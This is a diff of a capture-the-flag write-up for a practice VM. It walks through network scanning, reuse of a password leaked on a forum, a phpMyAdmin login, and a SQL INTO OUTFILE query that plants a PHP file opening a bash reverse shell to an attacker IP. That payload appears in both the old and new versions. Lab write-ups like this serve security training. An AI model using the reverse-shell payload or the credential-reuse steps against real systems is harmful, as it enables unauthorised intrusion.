@@ -2,138 +2,253 @@
 
 ## Write-Up 1
 
-After the vm setup the VM
+### Step: Scan network
+#### Why
 
-Scan network to find ip:
-`nmap -sP -sn 192.168.56.0/24`
+We don't know anything about the VM except that we share the same network
 
+#### How
 
-Scan open port for the IP:
-`nmap 192.168.56.4`
+With `nmap 192.168.56.0/24`, we scan the network.
 
+#### What
 
-Detect routes:
-`nmap -sV --script=http-enum 192.168.56.4`
+We get some of IP's on the network and information about services and open ports on each machine
 
-```sh
-21/tcp  open  ftp        vsftpd 2.0.8 or later
-22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
-|_http-server-header: Apache/2.2.22 (Ubuntu)
-143/tcp open  imap       Dovecot imapd
-443/tcp open  ssl/http   Apache httpd 2.2.22
+```
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 15:03 CEST
+Nmap scan report for 192.168.56.1
+Host is up (0.00032s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 192.168.56.2
+Host is up (0.00056s latency).
+All 1000 scanned ports on 192.168.56.2 are closed
+
+Nmap scan report for 192.168.56.6
+Host is up (0.10s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+
+Nmap done: 256 IP addresses (3 hosts up) scanned in 12.75 seconds
+```
+
+### Step: Try FTP connection
+#### Why
+
+We know there is a FTP service on port 21
+
+Most security flaw come from humans error, so we connect to ftp to see if a password is requiered
+
+#### How
+
+With `sftp $TARGET_USER@$TARGET_IP`, we connect to ftp service
+
+#### What
+
+However they ask us some password and we don't know it.
+
+```
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+root@192.168.56.6's password:
+Connection closed.
+```
+
+### Step: Try SSH connection
+#### Why
+
+We know there is a SSH service on port 22
+
+Most security flaw come from humans error, so we connect to SSH to see if a password is requiered
+
+#### How
+
+With `ssh "${TARGET_USER}@${TARGET_IP}"`, we connect to SSH service
+
+#### What
+
+However they ask us some password again and we don't know it either.
+
+```
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+root@192.168.56.6's password:
+```
+
+### Step: Try Web Browser
+#### Why
+
+We know there is an http and https service on port 80 and 443
+
+We could acces to the 'public' side of the target
+
+#### How
+
+Opening the browser and going to the target's address will lead to the public html page
+
+#### What
+
+There is nothing interresting on this page
+
+### Step: Detect common routes
+#### Why
+
+Some sites have hidden page, we are looking for the same here, just in case.
+
+#### How
+
+We are using `nmap --script=http-enum "${TARGET_IP}"` to detect the common routes on this site
+
+#### What
+
+This give us precious information
+
+```
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
 | http-enum:
 |   /forum/: Forum
 |   /phpmyadmin/: phpMyAdmin
 |   /webmail/src/login.php: squirrelmail version 1.4.22
 |_  /webmail/images/sm_logo.png: SquirrelMail
-|_http-server-header: Apache/2.2.22 (Ubuntu)
-993/tcp open  ssl/imaps?
-Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
+993/tcp open  imaps
 ```
 
-We can observe:
-    
-- Ports open:
+### Step: Scan the Forum
+#### Why
 
-    21/tcp  open  ftp        vsftpd 2.0.8 or later
+Messages with sensitive data inside are common on any forum
 
-    22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+#### How
 
-    80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+We are taking a look form the web browser
 
-    143/tcp open  imap       Dovecot imapd
+#### What
 
-    443/tcp open  ssl/http   Apache httpd 2.2.22
+We find 4 threads, one of them is intitled `Probleme login ?`
+> It's written by `lmezard` and we find this password `!q\]Ej?*5K5cy*AJ` with some sshd failed connexion logs
 
-    993/tcp open  ssl/imaps?
+### Step: Try password against SSH
+#### Why
 
-- 4 Routes on port 443:
+In the SSH logs, the user send his password within the username field which is not encrypted
 
-    /forum/: Forum
+#### How
 
-    /phpmyadmin/: phpMyAdmin
+We connect with `ssh lmezard@${TARGET_IP}`
 
-    /webmail/src/login.php: squirrelmail version 1.4.22
+#### What
 
-    /webmail/images/sm_logo.png: SquirrelMail
-
-
-- Forum:
-    We can curl the forum to see
-
-```sh
-curl --insecure 'https://192.168.56.4/forum/' | grep href | tr "<>" "\n" | grep href | sed 's/.* href/\
-href/g' | cut -d "=" -f2 | sed '/^..*$/!d'
-```
+We had hope but it's no surprise, this don't allow us
 
 ```
-"themes/default/style.min.css" media
-"index.php?mode
-"index.php?mode
-"themes/default/images/favicon.ico" /
-"./" title
-"index.php?mode
-"index.php?mode
-"index.php?mode
-"index.php?refresh
-"index.php?mode
-"index.php?fold_threads
-"index.php?toggle_view
-"index.php?id
-"index.php?mode
-"index.php?id
-"index.php?mode
-"index.php?id
-"index.php?mode
-"index.php?id
-"index.php?id
-"index.php?mode
-"index.php?id
-"index.php?mode
-"index.php?mode
-"index.php?mode
-"http://mylittleforum.net/"
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+lmezard@192.168.56.6's password:
+Permission denied, please try again.
+lmezard@192.168.56.6's password:
 ```
 
-From the web browser we can read a topic intitled "Probleme login?"
-`https://192.168.56.4/forum/index.php?id=6`
+### Step: Looking for data about lmezard
+#### Why
 
-We found inside 2 important data that we cannot guess, a username `lmezard` and a password `!q\]Ej?*5K5cy*AJ`
+This person is a (potential) security flaw. We should look deeper to see if any sensitive data were leaked somewhere
 
-We can see inside many log about failed connection try
-`curl --insecure 'https://192.168.56.4/forum/index.php?id=6' | grep 'Failed password'`
+#### How
 
-We found a password but doesn't work on ssh
+On the forum page there's a userspace, when comes times to login
 
-We will try on the webmail service
+What a surprise, we gain access with username: `lmezard` and the password: `!q\]Ej?*5K5cy*AJ`
 
-Doesn't work either
+#### What
 
-Instead, if we try to login on the forum 
+Clicking on the user profile shows us the user's email `laurie@borntosec.net`
 
-It works for te user `lmezard`
+### Step: Try Webmail
+#### Why
 
-Now we are logged we can see that there is no real difference between the previous situation, exept for the user space
+- We see that the domain name of the email is `borntosec.net`
+- So go directly to the webmail
 
-Inside the user spae we found the lmezard's email,that's `laurie@borntosec.net`
+#### How
 
-We can try to log to the webmail server at `webmail/src/login.php`
+With the web browser, we go to `/webmail/src/login.php`
 
-It works with the same password
+We try to connect with the previous user and password
 
-There's a mail with db access
+#### What
 
-We can connect to the phpmyadmin dashboard
+Once connected ( because this is the same password, believe it or not), we can find mails that laurie received
 
-From here you can launch a reverse shell
+There is a mail with DB access for phpmyadmin
 
-```sql
-SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 \"');" INTO OUTFILE '/var/www/forum/templates_c/7.php'
-```
+### Step: Connecting to PhpMyAdmin
+#### Why
+
+Because this is where we can find datas and php execution
+
+#### How
+
+we can connect with user: `root` and password: `Fg-'kKXBj87E:aJ$`
+
+#### What
+
+We have now access to the databases
+
+### Step: Executing Php code
+#### Why
+
+To run arbitrary code on the server side and gather more information, both could lead to privilege escalation
+
+#### How
+
+From the SQl panel:
+
+We can forge request to create a php file with code in it
+
+`SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 \"');" INTO OUTFILE '/var/www/forum/templates_c/1.php'`
+
+#### What
+
+We have now a remote shell that runs on the server side
+
+### Step
+#### Why
+#### How
+#### What
+
+------------------------------------
 
 we cat the file in `/home/LOOKATME/password`
 
